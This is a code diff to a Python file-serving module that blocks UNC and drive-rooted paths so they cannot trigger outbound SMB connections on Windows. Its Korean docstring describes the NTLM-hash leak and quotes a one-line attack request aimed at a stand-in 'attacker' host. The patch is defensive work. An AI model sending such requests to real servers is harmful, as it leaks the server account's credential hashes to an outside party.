@@ -7,7 +7,7 @@ from __future__ import annotations
 import hashlib
 import sys
 import time
-from pathlib import Path
+from pathlib import Path, PureWindowsPath
 from typing import Dict, Iterable, List, Optional
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
@@ -288,7 +288,16 @@ def safe_resolve(relpath: str) -> Optional[Path]:
     """data/ 기준 상대 경로를 검증해 절대 경로로 돌려준다.
 
     data/ 밖으로 나가거나 허용 확장자가 아니면 None.
+
+    🔴 **드라이브 · 루트가 붙은 경로는 `resolve()` 전에 버린다** (1.26.408).
+    `DATA_ROOT / "//호스트/공유/a.csv"`는 pathlib이 UNC 절대 경로로 바꾸고, 윈도우의
+    `resolve()`는 그 원격 경로를 **실제로 연다**(`_getfinalpathname`). 아래 data/ 안 검사가
+    404를 내기 전에 서버 PC가 바깥 SMB 서버에 접속해 계정의 NTLM 해시를 넘긴다 —
+    `GET /files///공격자/s/a.csv` 한 줄로 된다. 목록이 만드는 경로는 늘 상대 경로다.
     """
+    anchored = PureWindowsPath(relpath)
+    if anchored.drive or anchored.root or relpath.startswith(("/", "\\")):
+        return None
     try:
         target = (DATA_ROOT / relpath).resolve()
     except (OSError, ValueError):
